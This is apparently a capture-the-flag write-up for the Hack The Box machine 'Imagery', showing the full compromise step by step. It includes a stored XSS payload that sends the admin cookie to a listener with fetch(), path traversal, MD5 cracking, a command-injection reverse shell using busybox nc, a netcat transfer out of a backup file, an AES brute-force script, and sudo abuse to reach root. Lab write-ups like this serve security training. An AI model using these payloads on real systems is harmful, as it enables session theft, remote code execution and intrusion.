# HTB - Imagery

**Recon – Nmap**

nmap -sVC 10.129.52.240

- **22/tcp** – SSH
- **8000/tcp** – HTTP (Werkzeug, Python 3.12.7)

The web runs an *Image Gallery* application.

Add 10.129.52.240 imagery to /etc/hosts

Browse to 10.129.52.240:8000

Register an account and then login

Go to Report Bug page

## Initial foothold – Stored XSS → admin cookie

The **bug report** page contains stored XSS. Start a simple HTTP server to capture callbacks:

<aside>
💡

python3 -m http.server 4444

</aside>

Submit this payload in a bug report:

<aside>
💡

<img src=x onerror=fetch('http://10.10.14.60:4444/?pwned='+document.cookie)>

</aside>

When the admin opens the report the admin session cookie is exfiltrated to your listener.

<aside>
💡

10.129.52.240 - - [16/Oct/2025 05:29:12] "GET /?pwned=session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aPDI9Q.mUoDhBYERkl7jEhpS80Q7sn7ahc HTTP/1.1" 200 -

</aside>

With the stolen admin cookie you can call the admin log endpoint which reads files based on `log_identifier`:

<aside>
💡

COOKIE="session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aPDI9Q.mUoDhBYERkl7jEhpS80Q7sn7ahc”

</aside>

then

<aside>
💡

curl -s -H "Cookie: $COOKIE" \
"[http://10.129.52.240:8000/admin/get_system_log?log_identifier=../../../../home/web/web/db.json](http://10.129.184.125:8000/admin/get_system_log?log_identifier=../../../../home/web/web/db.json)" | jq .

</aside>

We get some users hashes:

<aside>
💡

Users": [
{
"username": "admin@imagery.htb",
"password": "5d9c1d507a3f76af1e5c97a3ad1eaa31",
"isAdmin": true,
"displayId": "a1b2c3d4",
"login_attempts": 0,
"isTestuser": false,
"failed_login_attempts": 0,
"locked_until": null
},
{
"username": "testuser@imagery.htb",
"password": "2c65c8d7bfbca32a3ed42596192384f6",
"isAdmin": false,
"displayId": "e5f6g7h8",
"login_attempts": 0,
"isTestuser": true,
"failed_login_attempts": 0,
"locked_until": null
}
],

</aside>

## Hash cracking

Save the hash locally:

```bash
echo '2c65c8d7bfbca32a3ed42596192384f6' >> hashes.txt

```

Crack with John:

```bash
john --format=raw-md5 --wordlist=rockyou.txt hashes.txt

```

We got the password:

<aside>
💡

iambatman 

</aside>

After cracking, use the credentials on the webapp.

<aside>
💡

testuser@imagery.htb

iambatman

</aside>

## Webshell – Command Injection in image transform

As a normal user (testuser) upload an image, then go to library and click on transform image and crop, intercept the transform/crop request in Burp, and modify the `height` parameter:

```json
"height":"100; busybox nc 10.10.14.100 4444 -e /bin/sh; echo"

```

Start a listener:

```bash
nc -lvnp 4444

```

Trigger the transform and obtain a web user shell.

To get interactive shell

<aside>
💡

python3 -c 'import pty; pty.spawn("/bin/bash")'

</aside>

## Pivot to mark – backup bruteforce

From the web shell enumerate backups:

```bash
ls -la /var/backup

```

Find:

```
web_20250806_120723.zip.aes

```

On the attacker machine:

<aside>
💡

nc -lvp 9001 > web_20250806_120723.zip.aes

</aside>

On the victim machine:

<aside>
💡

nc 10.10.14.100 9001 < /var/backup/web_20250806_120723.zip.aes

</aside>

Download the archive to your attacker host and brute-force it (custom script / pyAesCrypt loop). Once decrypted, extract the old `db.json` which contains historical user hashes (including `mark`).

## Install dependencies

```bash
sudo apt update
sudo apt install -y python3-pip unzip john
pip3 install pyAesCrypt hashid

```

## Brute-force script (pyAesCrypt)

Save this as `pyaes_bruteforce.py` in the same directory as `web_20250806_120723.zip.aes` and `rockyou.txt` (or point `-w` at your wordlist):

```python
#!/usr/bin/env python3
# pyaes_bruteforce.py
import pyAesCrypt, zipfile, os, sys, argparse
from pathlib import Path

parser = argparse.ArgumentParser()
parser.add_argument("-i","--input", default="web_20250806_120723.zip.aes")
parser.add_argument("-w","--wordlist", default="rockyou.txt")
parser.add_argument("-o","--out", default="decrypted.zip")
parser.add_argument("-b","--buffer", type=int, default=64*1024)
parser.add_argument("-s","--start", type=int, default=1)
args = parser.parse_args()

encfile = args.input
outfile = args.out
bufferSize = args.buffer
wordlist = args.wordlist

def is_valid_zip(path):
    try:
        with zipfile.ZipFile(path, 'r') as z:
            return z.testzip() is None
    except Exception:
        return False

with open(wordlist, 'r', errors='ignore') as fh:
    for idx, line in enumerate(fh, 1):
        if idx < args.start:
            continue
        pw = line.rstrip("\n\r")
        try:
            pyAesCrypt.decryptFile(encfile, outfile, pw, bufferSize)
            if is_valid_zip(outfile):
                print("[+] Password found:", pw)
                print("[+] Decrypted zip saved to:", outfile)
                sys.exit(0)
            else:
                os.remove(outfile)
        except Exception:
            # wrong password / decrypt error
            pass
        if idx % 500 == 0:
            print("Tried", idx, "passwords, last:", pw)
print("[-] Password not found in wordlist")

```

Make it executable:

```bash
chmod +x pyaes_bruteforce.py

```

Run it (adjust wordlist path if needed):

```bash
python3 ./pyaes_bruteforce.py -i web_20250806_120723.zip.aes -w /usr/share/wordlists/rockyou.txt -o decrypted.zip

```

Unzip decrypted.zip then

<aside>
💡

*cat web/db.json*

</aside>

Crack the `mark` hash offline:

```bash
echo '<mark_hash>' >> hashes.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

*su mark* and enter supersmash password when prompted and then User flag obtained at /home 

# **Privilege Escalation — charcol (sudo)**

<aside>
💡

sudo -l

</aside>

Discovered that the user mark can run /usr/local/bin/charcol as root
without a password.
charcol is a small backup utility that supports an interactive shell mode and has options such as--reset password to default.

<aside>
💡

sudo /usr/local/bin/charcol --help

</aside>

the help output shows `charcol` only exposes **`shell`** and a `--reset-password-to-default` (`-R`) option

Resetting the Charcol master passphrase to default

<aside>
💡

sudo /usr/local/bin/charcol -R

</aside>

Open the Charcol interactive shell as root

<aside>
💡

sudo /usr/local/bin/charcol shell

</aside>

(Inside charcol shell) Add a scheduled job to get the root flag

It schedules a job (named get_flag) that runs every minute and, as root, copies /root/root.txt to /tmp/root.txt then makes that copy readable by everyone.
So after a minute you can read the root file from /tmp/root.txt

<aside>
💡

auto add --schedule "* * * * *" --command "cp /root/root.txt /tmp/root.txt && chmod 777 /tmp/root.txt" --name "get_flag"

</aside>

Then we exit from the shell and go to mark home diretory

<aside>
💡

cat /tmp/root.txt

</aside>